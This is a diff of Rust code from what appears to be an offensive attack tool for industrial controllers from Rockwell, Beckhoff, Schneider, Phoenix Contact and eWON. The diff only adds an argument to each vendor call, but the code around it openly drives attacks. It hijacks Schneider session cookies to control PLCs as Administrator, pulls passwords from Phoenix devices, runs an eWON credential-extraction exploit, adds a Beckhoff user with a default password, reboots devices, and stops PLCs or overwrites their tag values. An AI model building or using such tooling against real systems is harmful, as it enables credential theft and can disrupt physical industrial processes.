@@ -468,7 +468,7 @@ fn scan_rockwell() {
     }
     use crate::vendors::rockwell::driver;
     let pb = crate::display::spinner_start(&format!("Connecting to {ip}…"));
-    let result = driver::get_device_info(&ip);
+    let result = driver::get_device_info(&ip, 0);
     pb.finish_and_clear();
     match result {
         Ok(dev) => {
@@ -559,7 +559,7 @@ fn beckhoff_device_info(ip: &str) {
     println!("  Kernel:   {}", dev.kernel);
 
     let pb2 = crate::display::spinner_start("Reading full device info…");
-    let info = scan::get_device_info_full(&dev, &local_netid);
+    let info = scan::get_device_info_full(&dev, &local_netid, 0);
     pb2.finish_and_clear();
     if let Some(info) = info {
         if let Some(os) = &info.os_name {
@@ -587,7 +587,7 @@ fn beckhoff_get_state(ip: &str) {
             return;
         }
     };
-    let state = scan::get_state(&dev, &local_netid);
+    let state = scan::get_state(&dev, &local_netid, 0);
     crate::display::print_info(&format!("TwinCAT state: {state}"));
 }
 
@@ -605,7 +605,7 @@ fn beckhoff_set_state(ip: &str, _code: u16, name: &str) {
         }
     };
     let pb2 = crate::display::spinner_start(&format!("Setting TwinCAT state to {name}…"));
-    let result = scan::set_twincat_state(&dev, &local_netid, name);
+    let result = scan::set_twincat_state(&dev, &local_netid, name, 0);
     pb2.finish_and_clear();
     match result {
         Ok(_) => crate::display::print_success(&format!("State set to {name}.")),
@@ -616,7 +616,7 @@ fn beckhoff_set_state(ip: &str, _code: u16, name: &str) {
 fn beckhoff_reboot(ip: &str) {
     use crate::vendors::beckhoff::webcontrol;
     let pb = crate::display::spinner_start(&format!("Sending reboot to {ip}…"));
-    let result = webcontrol::reboot(ip);
+    let result = webcontrol::reboot(ip, 0);
     pb.finish_and_clear();
     match result {
         Ok(_) => crate::display::print_success("Reboot command sent."),
@@ -629,7 +629,7 @@ fn beckhoff_add_user(ip: &str) {
     let pass = ask_input("Password", "Sc4d4v3r!");
     use crate::vendors::beckhoff::webcontrol;
     let pb = crate::display::spinner_start(&format!("Adding user '{user}' to {ip}…"));
-    let result = webcontrol::add_user(ip, &user, &pass);
+    let result = webcontrol::add_user(ip, 0, &user, &pass);
     pb.finish_and_clear();
     match result {
         Ok(_) => crate::display::print_success(&format!("User '{user}' creation command sent.")),
@@ -766,7 +766,7 @@ fn schneider_flash(ip: &str) {
 fn schneider_hijack(ip: &str, action: &str) {
     use crate::vendors::schneider::session_hijack;
     let pb = crate::display::spinner_start(&format!("Fetching session from {ip}…"));
-    let session = session_hijack::get_session_cookie(ip);
+    let session = session_hijack::get_session_cookie(ip, 0);
     pb.finish_and_clear();
     let session = match session {
         Some(s) => s,
@@ -781,10 +781,10 @@ fn schneider_hijack(ip: &str, action: &str) {
     ));
     match action {
         "info" => {
-            session_hijack::get_device_info(ip, &session.cookie_value, "Administrator");
+            session_hijack::get_device_info(ip, 0, &session.cookie_value, "Administrator");
         }
         a => {
-            let ok = session_hijack::control_plc(ip, &session.cookie_value, "Administrator", a);
+            let ok = session_hijack::control_plc(ip, 0, &session.cookie_value, "Administrator", a);
             if ok {
                 crate::display::print_success(&format!("PLC {a} command sent."));
             } else {
@@ -801,7 +801,7 @@ fn schneider_hijack(ip: &str, action: &str) {
 fn phoenix_device_info(ip: &str) {
     use crate::vendors::phoenix::control;
     let pb = crate::display::spinner_start(&format!("Querying {ip}…"));
-    let result = control::get_device_info(ip, false);
+    let result = control::get_device_info(ip, 0, false);
     pb.finish_and_clear();
     match result {
         Ok(info) => {
@@ -820,7 +820,7 @@ fn phoenix_device_info(ip: &str) {
 fn phoenix_passwords(ip: &str) {
     use crate::vendors::phoenix::webvisit;
     let pb = crate::display::spinner_start(&format!("Retrieving passwords from {ip}…"));
-    let result = webvisit::retrieve_passwords(ip);
+    let result = webvisit::retrieve_passwords(ip, 0);
     pb.finish_and_clear();
     match result {
         Ok(entries) if entries.is_empty() => crate::display::print_warn("No passwords retrieved."),
@@ -839,7 +839,7 @@ fn phoenix_passwords(ip: &str) {
 
 fn phoenix_list_tags(ip: &str) {
     use crate::vendors::phoenix::webvisit;
-    match webvisit::get_tags(ip) {
+    match webvisit::get_tags(ip, 0) {
         Ok((project, tags)) => {
             println!("  Project: {project}");
             for (i, t) in tags.iter().enumerate() {
@@ -853,14 +853,14 @@ fn phoenix_list_tags(ip: &str) {
 
 fn phoenix_read_tags(ip: &str) {
     use crate::vendors::phoenix::webvisit;
-    let (_, tags) = match webvisit::get_tags(ip) {
+    let (_, tags) = match webvisit::get_tags(ip, 0) {
         Ok(r) => r,
         Err(e) => {
             crate::display::print_error(&format!("{e}"));
             return;
         }
     };
-    match webvisit::read_tag_values(ip, &tags) {
+    match webvisit::read_tag_values(ip, 0, &tags) {
         Ok(values) => {
             for (name, val) in &values {
                 println!("  {name}: {val}");
@@ -877,7 +877,7 @@ fn phoenix_write_tag(ip: &str) {
         return;
     }
     let value = ask_input("New value", "0");
-    match webvisit::write_tag_value(ip, &tag_name, &value) {
+    match webvisit::write_tag_value(ip, 0, &tag_name, &value) {
         Ok(true) => crate::display::print_success(&format!("Wrote {tag_name} = {value}")),
         Ok(false) => crate::display::print_warn("Write sent (no confirmation)."),
         Err(e) => crate::display::print_error(&format!("{e}")),
@@ -890,7 +890,7 @@ fn phoenix_control(ip: &str, model: &str) {
     let pb = crate::display::spinner_start(&format!("Sending {action} to {model} at {ip}…"));
     let result = if model == "ilc390" {
         let a = if action == "stop" { "stop" } else { "start" };
-        control::control_ilc390(ip, a)
+        control::control_ilc390(ip, 0, a)
     } else {
         let a = if action == "stop" { "stop" } else { "start" };
         let st = match action.as_str() {
@@ -898,7 +898,7 @@ fn phoenix_control(ip: &str, model: &str) {
             "hot" => "hot",
             _ => "cold",
         };
-        control::control_ilc150(ip, a, st)
+        control::control_ilc150(ip, 0, a, st)
     };
     pb.finish_and_clear();
     match result {
@@ -914,7 +914,7 @@ fn phoenix_control(ip: &str, model: &str) {
 fn rockwell_info(ip: &str) {
     use crate::vendors::rockwell::driver;
     let pb = crate::display::spinner_start(&format!("Connecting to {ip}…"));
-    let result = driver::get_device_info(ip);
+    let result = driver::get_device_info(ip, 0);
     pb.finish_and_clear();
     match result {
         Ok(dev) => {
@@ -931,7 +931,7 @@ fn rockwell_info(ip: &str) {
 fn rockwell_tags(ip: &str) {
     use crate::vendors::rockwell::driver;
     let pb = crate::display::spinner_start(&format!("Enumerating tags on {ip}…"));
-    let result = driver::enumerate_tags(ip);
+    let result = driver::enumerate_tags(ip, 0);
     pb.finish_and_clear();
     match result {
         Ok(tags) => {
@@ -951,7 +951,7 @@ fn rockwell_read_tag(ip: &str) {
         return;
     }
     let pb = crate::display::spinner_start(&format!("Reading {name}…"));
-    let result = driver::read_tag(ip, &name);
+    let result = driver::read_tag(ip, 0, &name);
     pb.finish_and_clear();
     match result {
         Ok(raw) => {
@@ -983,7 +983,7 @@ fn rockwell_write_tag(ip: &str) {
         4 => 0x00C4,
         _ => 0x00C4,
     };
-    match driver::write_tag(ip, &name, type_code, &value_bytes) {
+    match driver::write_tag(ip, 0, &name, type_code, &value_bytes) {
         Ok(_) => crate::display::print_success(&format!("Wrote {name}.")),
         Err(e) => crate::display::print_error(&format!("{e}")),
     }
@@ -1014,7 +1014,7 @@ fn ewon_credentials(ip: &str) {
     let pb = crate::display::spinner_start(&format!("Extracting credentials from {ip}…"));
     // Drop the spinner before printing so output is clean
     pb.finish_and_clear();
-    match exploit::exploit(ip, "adm", max) {
+    match exploit::exploit(ip, 0, "adm", max) {
         Ok(users) if users.is_empty() => crate::display::print_warn("No credentials extracted."),
         Ok(users) => crate::display::print_success(&format!("{} credential(s) extracted.", users.len())),
         Err(e) => crate::display::print_error(&format!("{e}")),
